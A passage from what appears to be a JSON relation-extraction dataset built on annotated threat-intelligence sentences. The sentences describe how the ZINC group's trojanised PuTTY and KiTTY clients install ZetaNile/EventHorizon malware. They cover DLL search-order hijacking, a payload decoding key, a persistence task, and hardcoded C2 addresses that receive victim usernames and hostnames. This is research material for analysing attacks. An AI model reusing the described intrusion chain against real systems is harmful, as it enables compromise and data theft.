"group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "DLL", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "payload", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "custom key", "pos": [10, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "DLL", "pos": [17, 18], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [24, 24], "name": "Windows process", "pos": [24, 26], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [34, 34], "name": "malware family", "pos": [34, 36], "index": "5_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [38, 38], "name": "custom encryption", "pos": [38, 40], "index": "6_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [42, 42], "name": "AES encryption", "pos": [42, 44], "index": "7_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [57, 57], "name": "C2 domains", "pos": [57, 59], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [70, 70], "name": "ZetaNile", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [73, 73], "name": "victim information", "pos": [13, 15], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [92, 92], "name": "target", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [94, 94], "name": "ZINC", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [96, 96], "name": "PuTTY", "pos": [10, 11], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "KiTTY", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [104, 104], "name": "SSH clients", "pos": [18, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [114, 114], "name": "ZetaNile implant", "pos": [28, 30], "index": "16_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [118, 118], "name": "recipient", "pos": [32, 33], "index": "17_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [123, 123], "name": "executable file", "pos": [37, 39], "index": "18_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [127, 127], "name": "ReadMe.txt", "pos": [41, 42], "index": "19_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [135, 135], "name": "ZINC", "pos": [0, 1], "index": "20_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [155, 155], "name": "ZetaNile implant", "pos": [20, 22], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [167, 167], "name": "ZetaNile", "pos": [3, 4], "index": "22_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [174, 174], "name": "ReadMe.txt", "pos": [10, 11], "index": "23_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [180, 180], "name": "SSH utility", "pos": [16, 18], "index": "24_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [185, 185], "name": "PUTTY.exe", "pos": [21, 22], "index": "25_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [190, 190], "name": "Event Horizon malware", "pos": [26, 29], "index": "26_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [194, 194], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "27_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [199, 199], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "28_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [203, 203], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "29_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [207, 207], "name": "ZINC", "pos": [0, 1], "index": "30_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [214, 214], "name": "colorui.dll", "pos": [7, 8], "index": "31_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [224, 224], "name": "payload", "pos": [17, 18], "index": "32_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [229, 229], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "33_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [243, 243], "name": "C2 server", "pos": [5, 7], "index": "34_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [247, 247], "name": "attackers", "pos": [9, 10], "index": "35_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [251, 251], "name": "malware", "pos": [13, 14], "index": "36_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [274, 274], "name": "PackageColor", "pos": [36, 37], "index": "37_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [280, 280], "name": "weaponized PuTTY", "pos": [42, 44], "index": "38_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [289, 289], "name": "ZINC", "pos": [5, 6], "index": "39_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [297, 297], "name": "PackageColor", "pos": [13, 14], "index": "40_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [300, 300], "name": "weaponized PuTTY", "pos": [16, 18], "index": "41_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [305, 305], "name": "executable", "pos": [21, 22], "index": "42_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [309, 309], "name": "username", "pos": [25, 26], "index": "43_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [311, 311], "name": "hostname", "pos": [27, 28], "index": "44_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "IJ", "evidence": [0], "h": 5, "t": 6}, {"r": "IJ", "evidence": [0], "h": 5, "t": 7}, {"r": "ST", "evidence": [0], "h": 5, "t": 8}, {"r": "RF", "evidence": [0], "h": 5, "t": 8}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 9, "t": 10}, {"r": "CO", "evidence": [1, 2], "h": 9, "t": 16}, {"r": "ST", "evidence": [2], "t": 11, "h": 12}, {"r": "RF", "evidence": [2], "t": 11, "h": 12}, {"r": "FR", "evidence": [2], "h": 13, "t": 17}, {"r": "EX", "evidence": [2], "h": 17, "t": 18}, {"r": "CO", "evidence": [2, 3, 4], "h": 19, "t": 23}, {"r": "RD", "evidence": [2, 3], "t": 18, "h": 20}, {"r": "WR", "evidence": [3], "h": 20, "t": 21}, {"r": "WR", "evidence": [3], "h": 20, "t": 21}, {"r": "WR", "evidence": [3, 4], "t": 21, "h": 22}, {"r": "WR", "evidence": [3, 4], "t": 21, "h": 22}, {"r": "RD", "evidence": [4], "t": 23, "h": 24}, {"r": "RD", "evidence": [4], "h": 25, "t": 27}, {"r": "FR", "evidence": [4], "h": 25, "t": 26}, {"r": "WR", "evidence": [4], "h": 25, "t": 27}, {"r": "RD", "evidence": [4], "h": 25, "t": 29}, {"r": "RD", "evidence": [4], "h": 25, "t": 28}, {"r": "WR", "evidence": [4], "h": 25, "t": 29}, {"r": "WR", "evidence": [5], "h": 30, "t": 31}, {"r": "RD", "evidence": [5], "h": 30, "t": 32}, {"r": "RD", "evidence": [5], "h": 30, "t": 33}, {"r": "ST", "evidence": [6], "t": 34, "h": 35}, {"r": "RF", "evidence": [6], "t": 34, "h": 35}, {"r": "FR", "evidence": [6], "h": 35, "t": 36}, {"r": "FR", "evidence": [6], "t": 37, "h": 38}, {"r": "FR", "evidence": [6, 7], "h": 37, "t": 39}, {"r": "FR", "evidence": [7], "t": 40, "h": 41}, {"r": "RD", "evidence": [7], "h": 42, "t": 43}, {"r": "RD", "evidence": [7], "h": 42, "t": 44}]}, {"title": "054-2", "sents": [["To", "make", "C2", "communications", "blend", "in", "with", "legitimate", "traffic", ",", "ZetaNile", "encodes", "the", "victim", "information", "in", "parameters", "for", "common", "keywords", "such", "as", "gametype", "or", "bbs", "."], ["Upon", "establishing", "a", "connection", "with", "the", "target", ",", "ZINC", "operationalized", "PuTTY", "and", "KiTTY", ",", "malicious", "versions", "of", "two", "SSH", "clients", ",", "that", "act", "as", "entry", "vectors", "for", "the", "ZetaNile", "implant", ".", "The", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "ReadMe.txt", "to", "run", "after", "downloading", "the", "archive", "."], ["ZINC", "has", "developed", "the", "ZetaNile", "malware", "family", "to", "evade", "traditional", "defenses", ".", "The", "included", "executable", "file", "runs", "without", "dropping", "the", "ZetaNile", "implant", ",", "as", "part", "of", "this", "evolution", "."], ["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "ZetaNile", "pos": [10, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "victim information", "pos": [13, 15], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "target", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "ZINC", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "PuTTY", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "KiTTY", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "SSH clients", "pos": [18, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "ZetaNile implant", "pos": [28, 30], "index": "7_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [58, 58], "name": "recipient", "pos": [32, 33], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [63, 63], "name": "executable file", "pos": [37, 39], "index": "9_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [67, 67], "name": "ReadMe.txt", "pos": [41, 42], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [75, 75], "name": "ZINC", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [95, 95], "name": "ZetaNile implant", "pos": [20, 22], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "ZetaNile", "pos": [3, 4], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [114, 114], "name": "ReadMe.txt", "pos": [10, 11], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "SSH utility", "pos": [16, 18], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [125, 125], "name": "PUTTY.exe", "pos": [21, 22], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [130, 130], "name": "Event Horizon malware", "pos": [26, 29], "index": "17_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [134, 134], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "18_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [139, 139], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "19_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [143, 143], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [147, 147], "name": "ZINC", "pos": [0, 1], "index": "21_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [154, 154], "name": "colorui.dll", "pos": [7, 8], "index": "22_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [164, 164], "name": "payload", "pos": [17, 18], "index": "23_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [169, 169], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [183, 183], "name": "C2 server", "pos": [5, 7], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [187, 187], "name": "attackers", "pos": [9, 10], "index": "26_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [191, 191], "name": "malware", "pos": [13, 14], "index": "27_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [214, 214], "name": "PackageColor", "pos": [36, 37], "index": "28_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [220, 220], "name": "weaponized PuTTY", "pos": [42, 44], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [229, 229], "name": "ZINC", "pos": [5, 6], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [237, 237], "name": "PackageColor", "pos": [13, 14], "index": "31_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [240, 240], "name": "weaponized PuTTY", "pos": [16, 18], "index": "32_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [245, 245], "name": "executable", "pos": [21, 22], "index": "33_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [249, 249], "name": "username", "pos": [25, 26], "index": "34_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [251, 251], "name": "hostname", "pos": [27, 28], "index": "35_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [265, 265], "name": "executable", "pos": [8, 9], "index": "36_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [274, 274], "name": "172.93.201.253", "pos": [17, 18], "index": "37_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 8}, {"r": "EX", "evidence": [1], "h": 8, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 10, "t": 14}, {"r": "RD", "evidence": [1, 2], "t": 9, "h": 11}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2, 3], "t": 12, "h": 13}, {"r": "WR", "evidence": [2, 3], "t": 12, "h": 13}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "RD", "evidence": [3], "h": 16, "t": 18}, {"r": "FR", "evidence": [3], "h": 16, "t": 17}, {"r": "WR", "evidence": [3], "h": 16, "t": 18}, {"r": "RD", "evidence": [3], "h": 16, "t": 20}, {"r": "RD", "evidence": [3], "h": 16, "t": 19}, {"r": "WR", "evidence": [3], "h": 16, "t": 20}, {"r": "WR", "evidence": [4], "h": 21, "t": 22}, {"r": "RD", "evidence": [4], "h": 21, "t": 23}, {"r": "RD", "evidence": [4], "h": 21, "t": 24}, {"r": "ST", "evidence": [5], "t": 25, "h": 26}, {"r": "RF", "evidence": [5], "t": 25, "h": 26}, {"r": "FR", "evidence": [5], "h": 26, "t": 27}, {"r": "FR", "evidence": [5], "t": 28, "h": 29}, {"r": "FR", "evidence": [5, 6], "h": 28, "t": 30}, {"r": "FR", "evidence": [6], "t": 31, "h": 32}, {"r": "RD", "evidence": [6], "h": 33, "t": 34}, {"r": "RD", "evidence": [6], "h": 33, "t": 35}, {"r": "CO", "evidence": [6, 7], "h": 33, "t": 36}, {"r": "ST", "evidence": [7], "h": 36, "t": 37}]}, {"title": "054-3", "sents": [["Upon", "establishing", "a", "connection", "with", "the", "target", ",", "ZINC", "operationalized", "PuTTY", "and", "KiTTY", ",", "malicious", "versions", "of", "two", "SSH", "clients", ",", "that", "act", "as", "entry", "vectors", "for", "the", "ZetaNile", "implant", ".", "The", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "ReadMe.txt", "to", "run", "after", "downloading", "the", "archive", "."], ["ZINC", "has", "developed", "the", "ZetaNile", "malware", "family", "to", "evade", "traditional", "defenses", ".", "The", "included", "executable", "file", "runs", "without", "dropping", "the", "ZetaNile", "implant", ",", "as", "part", "of", "this", "evolution", "."], ["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "target", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "ZINC", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "PuTTY", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "KiTTY", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "SSH clients", "pos": [18, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [28, 28], "name": "ZetaNile implant", "pos": [28, 30], "index": "5_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [32, 32], "name": "recipient", "pos": [32, 33], "index": "6_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [37, 37], "name": "executable file", "pos": [37, 39], "index": "7_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [41, 41], "name": "ReadMe.txt", "pos": [41, 42], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "ZINC", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "ZetaNile implant", "pos": [20, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "ZetaNile", "pos": [3, 4], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [88, 88], "name": "ReadMe.txt", "pos": [10, 11], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [94, 94], "name": "SSH utility", "pos": [16, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [99, 99], "name": "PUTTY.exe", "pos": [21, 22], "index": "14_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [104, 104], "name": "Event Horizon malware", "pos": [26, 29], "index": "15_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [108, 108], "name": "C : \\ProgramData\\colorui.dll", "pos": [30, 33], "index": "16_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [113, 113], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [35, 38], "index": "17_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [117, 117], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [39, 42], "index": "18_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [121, 121], "name": "ZINC", "pos": [0, 1], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [128, 128], "name": "colorui.dll", "pos": [7, 8], "index": "20_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [138, 138], "name": "payload", "pos": [17, 18], "index": "21_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [143, 143], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [22, 23], "index": "22_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [157, 157], "name": "C2 server", "pos": [5, 7], "index": "23_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [161, 161], "name": "attackers", "pos": [9, 10], "index": "24_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [165, 165], "name": "malware", "pos": [13, 14], "index": "25_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [188, 188], "name": "PackageColor", "pos": [36, 37], "index": "26_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [194, 194], "name": "weaponized PuTTY", "pos": [42, 44], "index": "27_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [203, 203], "name": "ZINC", "pos": [5, 6], "index": "28_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [211, 211], "name": "PackageColor", "pos": [13, 14], "index": "29_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [214, 214], "name": "weaponized PuTTY", "pos": [16, 18], "index": "30_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [219, 219], "name": "executable", "pos": [21, 22], "index": "31_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [223, 223], "name": "username", "pos": [25, 26], "index": "32_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [225, 225], "name": "hostname", "pos": [27, 28], "index": "33_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [239, 239], "name": "executable", "pos": [8, 9], "index": "34_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [248, 248], "name": "172.93.201.253", "pos": [17, 18], "index": "35_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [277, 277], "name": "137.184.15.189", "pos": [8, 9], "index": "36_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [281, 281], "name": "KiTTY executable", "pos": [12, 14], "index": "37_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [291, 291], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "38_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [300, 300], "name": "Mscoree.dll", "pos": [31, 32], "index": "39_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [304, 304], "name": "EventHorizon", "pos": [35, 36], "index": "40_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 6}, {"r": "EX", "evidence": [0], "h": 6, "t": 7}, {"r": "CO", "evidence": [0, 1, 2], "h": 8, "t": 12}, {"r": "RD", "evidence": [0, 1], "t": 7, "h": 9}, {"r": "WR", "evidence": [1], "h": 9, "t": 10}, {"r": "WR", "evidence": [1], "h": 9, "t": 10}, {"r": "WR", "evidence": [1, 2], "t": 10, "h": 11}, {"r": "WR", "evidence": [1, 2], "t": 10, "h": 11}, {"r": "RD", "evidence": [2], "t": 12, "h": 13}, {"r": "RD", "evidence": [2], "h": 14, "t": 16}, {"r": "FR", "evidence": [2], "h": 14, "t": 15}, {"r": "WR", "evidence": [2], "h": 14, "t": 16}, {"r": "RD", "evidence": [2], "h": 14, "t": 18}, {"r": "RD", "evidence": [2], "h": 14, "t": 17}, {"r": "WR", "evidence": [2], "h": 14, "t": 18}, {"r": "WR", "evidence": [3], "h": 19, "t": 20}, {"r": "RD", "evidence": [3], "h": 19, "t": 21}, {"r": "RD", "evidence": [3], "h": 19, "t": 22}, {"r": "ST", "evidence": [4], "t": 23, "h": 24}, {"r": "RF", "evidence": [4], "t": 23, "h": 24}, {"r": "FR", "evidence": [4], "h": 24, "t": 25}, {"r": "FR", "evidence": [4], "t": 26, "h": 27}, {"r": "FR", "evidence": [4, 5], "h": 26, "t": 28}, {"r": "FR", "evidence": [5], "t": 29, "h": 30}, {"r": "RD", "evidence": [5], "h": 31, "t": 32}, {"r": "RD", "evidence": [5], "h": 31, "t": 33}, {"r": "CO", "evidence": [5, 6], "h": 31, "t": 34}, {"r": "ST", "evidence": [6], "h": 34, "t": 35}, {"r": "ST", "evidence": [7], "t": 36, "h": 37}, {"r": "RF", "evidence": [7], "t": 36, "h": 37}, {"r": "WR", "evidence": [7], "h": 37, "t": 38}, {"r": "WR", "evidence": [7], "h": 37, "t": 39}, {"r": "WR", "evidence": [7], "t": 39, "h": 40}, {"r": "WR", "evidence": [7], "t": 39, "h": 40}]}, {"title": "054-4", "sents": [["ZINC", "has", "developed", "the", "ZetaNile", "malware", "family", "to", "evade", "traditional", "defenses", ".", "The", "included", "executable", "file", "runs", "without", "dropping", "the", "ZetaNile", "implant", ",", "as", "part", "of", "this", "evolution", "."], ["For", "deployment", "of", "ZetaNile", ",", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "is", "necessary", "for", "the", "SSH", "utility", ".", "The", "malicious", "PUTTY.exe", "is", "programmed", "to", "install", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", ",", "copying", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["ZINC", "loads", "the", "second", "stage", "malware", ",", "colorui.dll", ",", "using", "DLL", "search", "order", "hijacking", "and", "decodes", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "for", "use", "in", "command", "and", "control", "."], ["After", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", ".", "Lastly", ",", "ZINC", "establishes", "persistence", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "weaponized", "PuTTY", "configuration", "."], ["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "ZINC", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "ZetaNile implant", "pos": [20, 22], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "ZetaNile", "pos": [3, 4], "index": "2_0"}], [{"type": "TF", 